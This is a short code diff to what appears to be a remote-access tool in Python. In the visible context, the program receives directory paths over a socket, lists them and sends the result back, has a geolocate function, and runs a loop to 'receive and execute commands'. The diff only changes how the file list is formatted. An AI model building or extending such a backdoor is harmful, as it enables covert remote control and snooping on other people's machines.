@@ -56,7 +56,7 @@ def main():
         user_input = s.recv(5000)
         user_input = user_input.decode()
         files = os.listdir(user_input)
-        files = str(files)
+        files = str("\n".join(files))
         s.send(files.encode())
 
     def geolocate():
@@ -127,7 +127,7 @@ def main():
     while True:
         try:
             """Receive and execute commands"""
-            
+
             command = s.recv(1024)
             command = command.decode()
 
